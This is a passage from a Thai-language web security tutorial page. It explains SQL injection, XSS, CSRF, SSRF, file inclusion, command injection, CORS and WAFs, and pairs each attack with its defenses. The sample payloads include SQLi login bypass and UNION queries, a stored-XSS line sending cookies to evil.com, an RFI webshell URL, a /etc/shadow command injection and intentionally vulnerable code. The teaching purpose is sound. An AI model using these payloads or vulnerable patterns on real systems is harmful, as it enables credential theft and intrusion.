+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Username: admin' --
+Password: anything</pre>
+<p><strong>คำสั่ง SQL ที่เกิดขึ้น:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>SELECT * FROM users WHERE username='admin' --' AND password='anything'</pre>
+<p><code>--</code> คือ SQL Comment — ทำให้ส่วนที่เหลือถูกมองข้าม — Login สำเร็จในฐานะ <code>admin</code></p>
+<p><strong>การโจมตีขั้นสูง — UNION Based SQLi:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Username: ' UNION SELECT username, password FROM users --
+SELECT * FROM users WHERE username='' UNION SELECT username, password FROM users --'
+— ดึง Username และ Password ของผู้ใช้ทั้งหมด</pre>
+<p><strong>การโจมตีแบบ Blind SQLi (Boolean-based):</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Username: admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --
+— ทาย Password ทีละตัวอักษร โดยดูจาก Response ของเซิร์ฟเวอร์ (True/False)</pre>
+<h3 id="section2-3" class="section-ref">2.3 ประเภทของ SQL Injection</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท</th><th>คำอธิบาย</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>In-band (Classic)</strong></td><td>ใช้ Channel เดียวกันในการโจมตีและรับผลลัพธ์</td><td>UNION SELECT — ผลลัพธ์แสดงบนหน้าเว็บ</td></tr>
+    <tr><td><strong>Blind (Inferential)</strong></td><td>ไม่เห็นผลลัพธ์โดยตรง — อนุมานจาก Behavior</td><td>Boolean-based, Time-based</td></tr>
+    <tr><td><strong>Out-of-band</strong></td><td>ใช้ Channel แยกในการรับข้อมูล</td><td>DNS Lookup, HTTP Request ไปยัง Server ของผู้โจมตี</td></tr>
+    <tr><td><strong>Error-based</strong></td><td>ใช้ Error Message จาก DB เพื่อหาข้อมูล</td><td><code>CONVERT(int,@@version)</code> — Error แสดง Version</td></tr>
+    <tr><td><strong>Stacked Query</strong></td><td>รันหลาย Query ในครั้งเดียว</td><td><code>'; DROP TABLE users; --</code></td></tr>
+  </tbody>
+</table></div>
+<h3 id="section2-4" class="section-ref">2.4 แนวทางการป้องกัน</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>✅ DO:
+├── ใช้ Parameterized Query (Prepared Statements) — บังคับ
+├── ใช้ ORM (Object-Relational Mapping) — ลดการเขียน SQL โดยตรง
+├── ใช้ Stored Procedure
+├── Input Validation — ตรวจสอบชนิดและรูปแบบข้อมูล
+├── Least Privilege — DB User มีสิทธิ์เฉพาะเท่าที่จำเป็น
+└── WAF — ใช้ Web Application Firewall เป็นแนวป้องกันเพิ่ม
+
+❌ DON'T:
+├── ต่อ String SQL โดยตรง — ❌ "$query = WHERE id=$id"
+├── ใช้ Dynamic SQL โดยไม่มีการ Escape
+├── แสดง Database Error โดยตรงต่อผู้ใช้
+└── ใช้ Admin/Superuser DB Account ใน Application</pre>
+<p><strong>ตัวอย่าง Parameterized Query (ปลอดภัย):</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>&lt;?php
+// ✅ ใช้ Prepared Statement (PHP)
+$stmt = $conn-&gt;prepare("SELECT * FROM users WHERE username=? AND password=?");
+$stmt-&gt;bind_param("ss", $username, $password);
+$stmt-&gt;execute();
+$result = $stmt-&gt;get_result();
+if ($result-&gt;num_rows &gt; 0) {
+    echo "Login successful!";
+}
+?&gt;</pre>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>// ✅ Java JDBC PreparedStatement
+String query = "SELECT * FROM users WHERE username = ? AND password = ?";
+PreparedStatement pstmt = connection.prepareStatement(query);
+pstmt.setString(1, username);
+pstmt.setString(2, password);
+ResultSet rs = pstmt.executeQuery();</pre>
+</section>
+<hr>
+
+<!-- SECTION 3 -->
+<section id="section3" class="section-ref">
+<h2>3. Cross-Site Scripting (XSS)</h2>
+<h3 id="section3-1" class="section-ref">3.1 หลักการ</h3>
+<p>XSS เกิดเมื่อผู้โจมตีสามารถแทรก <strong>JavaScript (หรือ HTML/CSS)</strong> ที่เป็นอันตรายเข้าไปในหน้าเว็บที่ผู้ใช้รายอื่นเปิดดู — Script จะทำงานใน Browser ของเหยื่อด้วยสิทธิ์ของเว็บนั้น</p>
+<h3 id="section3-2" class="section-ref">3.2 ประเภทของ XSS</h3>
+<p><strong>1. Reflected XSS (Non-Persistent):</strong></p>
+<p>Payload อยู่ใน Request (URL, Form) และสะท้อนกลับมาใน Response ทันที — ต้องให้เหยื่อคลิก Link ที่ผู้โจมตีสร้างขึ้น</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>URL:  https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+Response:  &lt;html&gt;ผลการค้นหา: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/html&gt;</pre>
+<p><strong>2. Stored XSS (Persistent):</strong></p>
+<p>Payload ถูกบันทึกใน Database และแสดงเมื่อผู้ใช้เปิดหน้าเว็บนั้น — รุนแรงที่สุด เพราะไม่ต้องหลอกให้คลิก Link</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>ช่องโหว่: ช่องแสดงความคิดเห็น (Comment Box)
+Payload ที่บันทึก:  &lt;script&gt;document.location='https://evil.com/steal.php?c='+document.cookie&lt;/script&gt;
+
+ผู้ใช้ A: เปิดหน้าเว็บ → Script ทำงาน → Cookie ถูกส่งไปยัง evil.com</pre>
+<p><strong>3. DOM-based XSS:</strong></p>
+<p>Payload ทำงานผ่าน DOM ใน Browser โดยที่ Server ไม่ได้ส่ง HTML ที่มีอันตราย — เกิดจาก JavaScript ฝั่ง Client ที่เขียนข้อมูลจาก Source ที่ไม่น่าเชื่อถือ (location.hash, document.referrer) ลงใน DOM</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>// ❌ ช่องโหว่ DOM-based XSS — ใช้ innerHTML โดยตรง
+var name = location.hash.substring(1);
+document.getElementById('welcome').innerHTML = 'Welcome, ' + name;
+
+// URL: https://example.com/#&lt;img src=x onerror=alert(1)&gt;
+// → Script ทำงานโดย Server ไม่รู้เรื่อง</pre>
+<h3 id="section3-3" class="section-ref">3.3 ตารางเปรียบเทียบ XSS</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท</th><th>Persistence</th><th>ต้องให้เหยื่อคลิก</th><th>Server Side Logic</th><th>Severity</th></tr></thead>
+  <tbody>
+    <tr><td>Reflected XSS</td><td>❌ ไม่เก็บ</td><td>✅ ต้องคลิก Link</td><td>เกี่ยวข้อง</td><td>ปานกลาง</td></tr>
+    <tr><td>Stored XSS</td><td>✅ เก็บใน DB</td><td>❌ ไม่ต้อง</td><td>เกี่ยวข้อง</td><td>สูงมาก</td></tr>
+    <tr><td>DOM-based XSS</td><td>ขึ้นอยู่กับ Code</td><td>ขึ้นอยู่กับ Code</td><td>ไม่เกี่ยวข้อง</td><td>ปานกลาง-สูง</td></tr>
+  </tbody>
+</table></div>
+<h3 id="section3-4" class="section-ref">3.4 แนวทางการป้องกัน</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>✅ DO:
+├── Output Encoding — แปลง Special Characters ก่อนแสดงผล
+│   └── &lt; → &amp;lt;   &gt; → &amp;gt;   " → &amp;quot;   ' → &amp;#39;   &amp; → &amp;amp;
+├── Context-Aware Encoding — ตามตำแหน่งที่แทรก (HTML, Attribute, JS, CSS, URL)
+├── Content Security Policy (CSP) — จำกัดแหล่งที่มาของ Script
+├── HttpOnly Cookie — Cookie ไม่สามารถเข้าถึงได้จาก JavaScript
+├── DOMPurify — Sanitize HTML ก่อนแทรกลง DOM
+└── Input Validation — อย่างน้อยเป็น Secondary Defense
+
+❌ DON'T:
+├── ใช้ innerHTML, document.write, eval() กับข้อมูลจากผู้ใช้
+├── เชื่อว่า Server-Side Validation เพียงพอ — XSS ทำงานฝั่ง Client
+├── ไว้ใจ URL Parameter ว่าไม่เป็นอันตราย
+└── แสดง Raw User Input โดยไม่มีการ Sanitize</pre>
+<p><strong>ตัวอย่าง Output Encoding (Java JSP):</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>&lt;%-- ❌ ไม่ปลอดภัย --%&gt;
+&lt;%= request.getParameter("name") %&gt;
+
+&lt;%-- ✅ ปลอดภัย (HTML Entity Encoding) --%&gt;
+&lt;%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %&gt;
+&lt;c:out value="${param.name}" /&gt;
+
+&lt;%-- ✅ กำหนด Context Encoding --%&gt;
+&lt;script&gt;var name = '&lt;c:out value="${param.name}" /&gt;';&lt;/script&gt;</pre>
+<p><strong>ตัวอย่าง Output Encoding (Python Django):</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button># Django Template — Auto Escape (เปิดโดย default)
+# ถ้าใน view:
+context = {'user_input': '&lt;script&gt;alert(1)&lt;/script&gt;'}
+
+# ใน template:
+{{ user_input }}
+# → &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;  (ปลอดภัย)
+
+# ❌ ถ้าต้องการ Raw HTML (ต้องแน่ใจว่าปลอดภัย):
+{{ user_input|safe }}  # ไม่แนะนำถ้าไม่แน่ใจ</pre>
+</section>
+<hr>
+
+<!-- SECTION 4 -->
+<section id="section4" class="section-ref">
+<h2>4. Cross-Site Request Forgery (CSRF)</h2>
+<h3 id="section4-1" class="section-ref">4.1 หลักการ</h3>
+<p>CSRF (หรือ XSRF) เกิดเมื่อผู้โจมตีหลอกให้ผู้ใช้ที่ <strong>กำลังล็อกอินอยู่ในเว็บนั้น</strong> ส่ง Request ที่ไม่พึงประสงค์ไปยังเว็บ — โดยที่เว็บไม่สามารถแยกแยะว่า Request นั้นมาจากผู้ใช้จริงหรือถูกปลอมแปลง</p>
+<h3 id="section4-2" class="section-ref">4.2 ตัวอย่างการโจมตี</h3>
+<p><strong>สถานการณ์:</strong> ผู้ใช้กำลังล็อกอินในธนาคารออนไลน์ (ยังไม่ Logout) แล้วเปิดเว็บอันตราย</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>&lt;!-- เว็บอันตราย — มีรูปภาพ (Image Tag) ที่ส่ง Request ไปยังธนาคาร --&gt;
+&lt;img src="https://bank.example.com/transfer?to=attacker&amp;amount=10000"
+     width="0" height="0" /&gt;</pre>
+<p><strong>สิ่งที่เกิดขึ้น:</strong></p>
+<ol>
+  <li>Browser ของผู้ใช้ส่ง Request ไปยัง <code>bank.example.com</code></li>
+  <li>Cookie ของธนาคารถูกแนบไปโดยอัตโนมัติ</li>
+  <li>เซิร์ฟเวอร์ธนาคารเห็น Cookie ที่ถูกต้อง → คิดว่าเป็น Request จากผู้ใช้จริง</li>
+  <li>เงิน 10,000 บาทถูกโอนไปยังบัญชีผู้โจมตี</li>
+</ol>
+<h3 id="section4-3" class="section-ref">4.3 เงื่อนไขที่ทำให้ CSRF สำเร็จ</h3>
+<ol>
+  <li>ผู้ใช้กำลังล็อกอินอยู่ใน Target Site (มี Session Cookie)</li>
+  <li>Target Site ไม่มี CSRF Token หรือ Token Validation ที่เพียงพอ</li>
+  <li>ผู้ใช้เปิดเว็บที่เป็นอันตราย (หรืออีเมล phishing)</li>
+</ol>
+<h3 id="section4-4" class="section-ref">4.4 แนวทางการป้องกัน</h3>
+<p><strong>1. CSRF Token (Synchronizer Token Pattern):</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>&lt;!-- Server สร้าง Token แบบสุ่มและแนบใน Form --&gt;
+&lt;form action="/transfer" method="POST"&gt;
+    &lt;input type="hidden" name="csrf_token" value="R4nd0mT0k3n!@#$" /&gt;
+    &lt;input type="text" name="to_account" /&gt;
+    &lt;input type="number" name="amount" /&gt;
+    &lt;input type="submit" value="โอนเงิน" /&gt;
+&lt;/form&gt;</pre>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button># Flask — ใช้ Flask-WTF (CSRF Protection)
+from flask_wtf.csrf import CSRFProtect
+csrf = CSRFProtect(app)
+
+@app.route('/transfer', methods=['POST'])
+def transfer():
+    token = request.form.get('csrf_token')
+    if not token or token != session['csrf_token']:
+        abort(403)  # Forbidden</pre>
+<p><strong>2. SameSite Cookie Attribute:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly</pre>
+<div class="table-wrap"><table>
+  <thead><tr><th>SameSite Value</th><th>คำอธิบาย</th></tr></thead>
+  <tbody>
+    <tr><td><code>Strict</code></td><td>Cookie ไม่ถูกส่งใน Cross-Site Request ทุกประเภท — ปลอดภัยที่สุดแต่ UX แย่</td></tr>
+    <tr><td><code>Lax</code> (Default)</td><td>Cookie ถูกส่งเฉพาะ Top-level Navigation (GET, Link) — ไม่ส่งด้วย POST จาก Cross-Site</td></tr>
+    <tr><td><code>None</code></td><td>Cookie ถูกส่งทุก Cross-Site Request — ต้องใช้ร่วมกับ Secure (HTTPS Only)</td></tr>
+  </tbody>
+</table></div>
+<p><strong>3. Custom Header Validation:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>// ✅ ส่ง Custom Header ด้วย JavaScript (CSRF Protected)
+fetch('/api/transfer', {
+    method: 'POST',
+    headers: {
+        'X-Requested-With': 'XMLHttpRequest',
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({to: 'attacker', amount: 10000})
+});
+// Browser SOP ป้องกันไม่ให้ Custom Header ถูกส่งจาก Cross-Origin</pre>
+<p><strong>4. Double Submit Cookie:</strong> ส่ง Random Token ทั้งใน Cookie และ Request Body/Header — Server ตรวจสอบว่าทั้งสองค่า match กัน</p>
+</section>
+<hr>
+
+<!-- SECTION 5 -->
+<section id="section5" class="section-ref">
+<h2>5. Server-Side Request Forgery (SSRF)</h2>
+<h3 id="section5-1" class="section-ref">5.1 หลักการ</h3>
+<p>SSRF เกิดเมื่อผู้โจมตีสามารถบังคับให้ <strong>Server ทำ Request ไปยัง URL ที่ผู้โจมตีกำหนด</strong> — ทำให้ผู้โจมตีสามารถเข้าถึงระบบภายในที่ปกติไม่สามารถเข้าถึงได้จากภายนอก</p>
+<h3 id="section5-2" class="section-ref">5.2 ตัวอย่างการโจมตี</h3>
+<p><strong>ช่องโหว่ — แอปพลิเคชันที่รับ URL และ Fetch มาแสดงผล:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>&lt;?php
+// ❌ ช่องโหว่ SSRF — ไม่ตรวจสอบ URL
+$url = $_GET['url'];
+$content = file_get_contents($url);  // Fetch URL ใดก็ได้
+echo $content;
+?&gt;</pre>
+<p><strong>การโจมตี — เข้าถึง Internal Service:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>URL: https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
+→ AWS Metadata Endpoint (Internal) — ข้อมูล Credentials ของ Cloud Server!
+
+URL: https://example.com/fetch?url=http://localhost:9200/
+→ Elasticsearch API (Internal) — อาจดึงข้อมูลจาก Database!
+
+URL: https://example.com/fetch?url=file:///etc/passwd
+→ Local File Read — ใช้ file:// protocol อ่านไฟล์ภายใน Server</pre>
+<h3 id="section5-3" class="section-ref">5.3 ประเภทของ SSRF</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท</th><th>คำอธิบาย</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Basic SSRF</strong></td><td>Response ถูกส่งกลับมายังผู้โจมตี</td><td>URL → Internal Service → Response แสดงผล</td></tr>
+    <tr><td><strong>Blind SSRF</strong></td><td>ไม่เห็น Response — ต้องใช้ Side Channel</td><td>URL → Internal Service → Time delay หรือ Error</td></tr>
+    <tr><td><strong>Semi-Blind SSRF</strong></td><td>Response บางส่วน — ใช้ Error Message</td><td>URL → Internal Service → Error ที่เปิดเผยข้อมูล</td></tr>
+  </tbody>
+</table></div>
+<h3 id="section5-4" class="section-ref">5.4 แนวทางการป้องกัน</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>✅ DO:
+├── Whitelist URLs ที่อนุญาตให้ Fetch — ดีที่สุด
+├── Block Private/RFC 1918 IPs: 10.x.x.x, 172.16-31.x.x, 192.168.x.x
+├── Block Localhost: 127.0.0.1, ::1, localhost
+├── Block Metadata Endpoints: 169.254.169.254 (AWS/Azure/GCP)
+├── Validate URL Scheme: อนุญาตเฉพาะ http/https
+├── DNS Resolution Validation — ป้องกัน DNS Rebinding Attack
+├── Network Segmentation — Internal Services ไม่ควรเข้าถึงได้จาก App Server
+└── Disable Redirect Following — ผู้โจมตีใช้ Redirect หลบ Blacklist
+
+❌ DON'T:
+├── รับ URL จากผู้ใช้โดยตรงโดยไม่ตรวจสอบ — ❌
+├── ใช้ Blacklist URLs (หลบเลี่ยงได้ง่าย)
+├── แสดง Response ที่มาจาก Internal Service โดยตรง
+└── วาง Metadata Endpoint ไว้ใน Network ที่ App Server เข้าถึงได้</pre>
+</section>
+<hr>
+
+<!-- SECTION 6 -->
+<section id="section6" class="section-ref">
+<h2>6. การโจมตีทางเว็บอื่นๆ (เพิ่มเติม)</h2>
+<h3 id="section6-1" class="section-ref">6.1 Local File Inclusion (LFI) / Remote File Inclusion (RFI)</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>LFI: รวมไฟล์ในเครื่องเมื่อ Application รับ Path จากผู้ใช้
+URL: https://example.com/page?file=../../../etc/passwd
+→ อ่านไฟล์ /etc/passwd
+
+RFI: รวมไฟล์จาก Remote Server
+URL: https://example.com/page?file=http://evil.com/shell.txt
+→ รวม Webshell จาก Server ภายนอก (รุนแรงมาก — RCE)</pre>
+<h3 id="section6-2" class="section-ref">6.2 Command Injection</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>ผู้โจมตีสั่งคำสั่ง OS ผ่าน Input ของเว็บแอปพลิเคชัน
+URL: https://example.com/ping?ip=8.8.8.8;cat /etc/shadow
+→ Server รัน: ping -c 4 8.8.8.8;cat /etc/shadow
+→ พิมพ์เนื้อหา /etc/shadow</pre>
+<h3 id="section6-3" class="section-ref">6.3 Path Traversal (Directory Traversal)</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>การเข้าถึงไฟล์ที่อยู่นอก Web Root Directory
+URL: https://example.com/static/../../../etc/passwd
+→ อ่าน /etc/passwd จาก Web Server</pre>
+<h3 id="section6-4" class="section-ref">6.4 Insecure Deserialization</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>การโจมตี Serialized Object ที่ถูกส่งจาก Client ไปยัง Server
+— ใช้ใน Java, PHP, Python, .NET
+— PHP: unserialize(), Java: readObject()
+— อาจนำไปสู่ RCE (Remote Code Execution)</pre>
+</section>
+<hr>
+
+<!-- SECTION 7 -->
+<section id="section7" class="section-ref">
+<h3>ส่วนที่ 2: การป้องกันเว็บแอปพลิเคชัน</h3>
+<h2>7. Same-Origin Policy (SOP) และ CORS</h2>
+<h3 id="section7-1" class="section-ref">7.1 Same-Origin Policy (SOP)</h3>
+<p>SOP คือกลไกความปลอดภัยพื้นฐานของ Browser ที่จำกัดการทำงานของ Script จาก Origin หนึ่ง ในการเข้าถึง Resource จากอีก Origin หนึ่ง</p>
+<p><strong>Origin = Protocol + Host + Port</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>https://example.com:443
+    ↕          ↕       ↕
+  Protocol   Host    Port
+
+เปรียบเทียบ Origin:
+──────────────────────
+https://example.com/page1.html
+https://example.com/page2.html
+→ ✅ Same Origin (Protocol, Host, Port เหมือนกัน)
+
+https://example.com
+http://example.com
+→ ❌ Different Origin (Protocol ต่างกัน — https vs http)
+
+https://example.com
+https://api.example.com
+→ ❌ Different Origin (Host ต่างกัน)</pre>
+<h3 id="section7-2" class="section-ref">7.2 ข้อยกเว้นของ SOP (SOP DOES NOT BLOCK)</h3>
+<p>SOP <strong>ไม่</strong> ป้องกันการกระทำเหล่านี้ (เพราะอาศัย HTML Tags ไม่ใช่ JavaScript):</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>&lt;!-- ✅ Cross-Origin Request ที่ SOP อนุญาต --&gt;
+&lt;img src="https://other-site.com/image.jpg"&gt;     &lt;!-- Image --&gt;
+&lt;link rel="stylesheet" href="https://other-site.com/style.css"&gt;  &lt;!-- CSS --&gt;
+&lt;script src="https://other-site.com/analytics.js"&gt;&lt;/script&gt;  &lt;!-- JS --&gt;
+&lt;form action="https://other-site.com/login" method="POST"&gt;  &lt;!-- Form --&gt;
+&lt;!-- เบราว์เซอร์จะส่ง Request แต่ JavaScript ไม่สามารถอ่าน Response ได้ --&gt;</pre>
+<p>นี่คือสาเหตุที่ CSRF ทำงานได้ — Form และ Image Tag ข้าม Origin ได้</p>
+<h3 id="section7-3" class="section-ref">7.3 CORS (Cross-Origin Resource Sharing)</h3>
+<p>CORS เป็นกลไกที่ผ่อนปรนข้อจำกัดของ SOP โดยใช้ HTTP Headers เพื่อบอก Browser ว่า "Origin นี้ได้รับอนุญาตให้เข้าถึง Resource ของเราได้"</p>
+<p><strong>CORS Request Flow (Preflight):</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>OPTIONS /api/data HTTP/1.1
+Origin: https://frontend.example.com
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: Content-Type, Authorization
+
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://frontend.example.com
+Access-Control-Allow-Methods: GET, POST, PUT
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Max-Age: 86400</pre>
+<p><strong>Simple Request (GET/POST with limited Content-Type):</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>GET /api/data HTTP/1.1
+Origin: https://frontend.example.com
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://frontend.example.com
+Access-Control-Allow-Credentials: true</pre>
+<h3 id="section7-4" class="section-ref">7.4 แนวทางการกำหนดค่า CORS</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>✅ DO:
+├── ระบุ Origin เจาะจง — ❌ อย่าใช้ * สำหรับ Credential Requests
+├── ถ้าใช้ Credential (cookie): origin + Access-Control-Allow-Credentials:true
+├── จำกัด Methods — เปิดให้เฉพาะที่จำเป็น (GET, POST)
+├── จำกัด Headers — เปิดให้เฉพาะที่จำเป็น
+├── ใช้ Vary: Origin Header — สำหรับ Caching
+└── ใช้ SPA Proxy (Nginx) จัดการ CORS แทน Application
+
+❌ DON'T:
+├── Access-Control-Allow-Origin: * (สำหรับ API ที่ต้อง Authentication)
+├── Access-Control-Allow-Origin: null (อันตราย — iframe sandbox ใช้ null origin)
+├── เชื่อว่า CORS ป้องกัน CSRF — ไม่ได้! (Form-based CSRF ไม่ใช้ JavaScript)
+└── Mirror Origin โดยไม่ตรวจสอบ</pre>
+</section>
+<hr>
+
+<!-- SECTION 8 -->
+<section id="section8" class="section-ref">
+<h2>8. Web Application Firewall (WAF)</h2>
+<h3 id="section8-1" class="section-ref">8.1 หลักการทำงานของ WAF</h3>
+<p>WAF คือระบบรักษาความปลอดภัยที่ทำงานใน Layer 7 (Application Layer) คอยตรวจสอบ HTTP/HTTPS Traffic ระหว่าง Client และ Web Server เพื่อตรวจจับและป้องกันการโจมตีทางเว็บ</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>WAF Deployment:
+────────────────
+[Client] ──▶ [WAF] ──▶ [Web Server]
+                 │
+           ตรวจสอบ Request:
+           ├── SQL Injection → Block
+           ├── XSS → Block
+           ├── CSRF → Block/Challenge
+           ├── LFI/RFI → Block
+           └── Normal → Forward</pre>
+<h3 id="section8-2" class="section-ref">8.2 โหมดการทำงานของ WAF</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>โหมด</th><th>การทำงาน</th><th>เหมาะกับ</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Blocking Mode</strong></td><td>บล็อก Traffic ที่เป็นอันตราย</td><td>Production — หลังจาก Tuning</td></tr>
+    <tr><td><strong>Detection Mode</strong></td><td>แจ้งเตือนอย่างเดียว ไม่บล็อก</td><td>เริ่มต้นใช้งาน — เก็บ Baseline</td></tr>
+    <tr><td><strong>Learning Mode</strong></td><td>เรียนรู้ Traffic ปกติเพื่อสร้าง Profile</td><td>การปรับตั้งค่า WAF</td></tr>
+    <tr><td><strong>Logging Mode</strong></td><td>บันทึกทุก Request พร้อมคะแนนความเสี่ยง</td><td>Forensic, Compliance</td></tr>
+  </tbody>
+</table></div>
+<h3 id="section8-3" class="section-ref">8.3 ประเภทของ WAF</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>┌────────────────────────────────────────────────────────────┐
+│                    WAF ประเภทต่างๆ                          │
+│  ┌────────────┐  ┌────────────┐  ┌────────────┐           │
+│  │Network WAF  │  │ Host WAF   │  │ Cloud WAF   │          │
+│  │(Hardware)   │  │(Software)  │  │(SaaS)       │          │
+│  ├────────────┤  ├────────────┤  ├────────────┤           │
+│  │ F5 ASM     │  │ ModSecurity│  │ Cloudflare  │          │
+│  │ Imperva    │  │ NAXSI      │  │ AWS WAF     │          │
+│  │ FortiWeb   │  │ libinjection│  │ Akamai WAF  │          │
+│  └────────────┘  └────────────┘  └────────────┘           │
+└────────────────────────────────────────────────────────────┘</pre>
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท</th><th>จุดเด่น</th><th>จุดอ่อน</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Network WAF</strong></td><td>Performance สูง, Central Management</td><td>ราคาแพง, Hardware Maintenance</td></tr>
+    <tr><td><strong>Host WAF</strong></td><td>ต้นทุนต่ำ, ยืดหยุ่น, Open Source</td><td>ใช้ทรัพยากร Server, ต้องติดตั้งเอง</td></tr>
+    <tr><td><strong>Cloud WAF</strong></td><td>ดูแลง่าย, Auto-scale, CDN Integration</td><td>ค่าใช้จ่ายตามปริมาณ Traffic, Data Privacy</td></tr>
+  </tbody>
+</table></div>
+<h3 id="section8-4" class="section-ref">8.4 ModSecurity + OWASP CRS</h3>
+<p><strong>ModSecurity</strong> คือ Open Source WAF Engine ที่ทำงานร่วมกับ Web Server (Apache, Nginx, IIS)<br>
+<strong>OWASP CRS (Core Rule Set)</strong> คือชุดกฎสำหรับ ModSecurity ที่ครอบคลุม OWASP Top 10</p>
+<p><strong>การติดตั้ง ModSecurity + CRS:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button># ติดตั้ง ModSecurity
+sudo apt install libapache2-mod-security2
+
+# ดาวน์โหลด OWASP CRS
+git clone https://github.com/coreruleset/coreruleset /etc/modsecurity/crs
+
+# ตั้งค่า CRS
+cp /etc/modsecurity/crs/crs-setup.conf.example /etc/modsecurity/crs/crs-setup.conf</pre>
+<p><strong>ตัวอย่าง Rule ใน CRS (SQL Injection Detection — Rule 942100):</strong></p>
